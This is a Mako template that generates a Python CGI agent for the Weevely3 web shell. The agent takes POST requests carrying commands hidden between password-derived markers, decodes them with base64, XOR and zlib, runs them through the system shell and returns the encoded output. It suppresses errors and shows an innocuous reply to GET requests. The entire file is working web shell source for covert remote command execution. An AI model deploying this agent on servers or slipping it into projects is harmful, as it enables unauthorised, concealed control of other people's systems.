<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
<%text>#!/usr/bin/env python3</%text>
import sys
import os
import zlib
import base64
import subprocess

# Weevely3 Python CGI Agent
# Implements XOR -> GZIP -> Base64 protocol

def xor(data, key):
    key_len = len(key)
    return bytearray([b ^ key[i % key_len] for i, b in enumerate(data)])

def run():
    # Password hash parts injected by generator
    k = b"${key}"
    kh = b"${header}"
    kf = b"${footer}"
    p = b"${PREPEND}"

    if os.environ.get("REQUEST_METHOD") == "POST":
        try:
            content = sys.stdin.buffer.read()
            
            start = content.find(kh)
            end = content.find(kf)

            if start != -1 and end != -1:
                payload = content[start + len(kh) : end]

                # Decode: Base64 -> XOR -> Gunzip
                decoded = base64.b64decode(payload)
                unxorred = xor(decoded, k)
                cmd = zlib.decompress(unxorred).decode("utf-8")

                # Execute Command
                # We expect a shell command
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                output = stdout + stderr

                # Encode: Gzip -> XOR -> Base64
                compressed = zlib.compress(output)
                re_xorred = xor(compressed, k)
                encoded = base64.b64encode(re_xorred)

                sys.stdout.buffer.write(p + kh + encoded + kf)

        except Exception:
            pass
    else:
        print("Content-Type: text/plain\n\n")

if __name__ == "__main__":
    run()
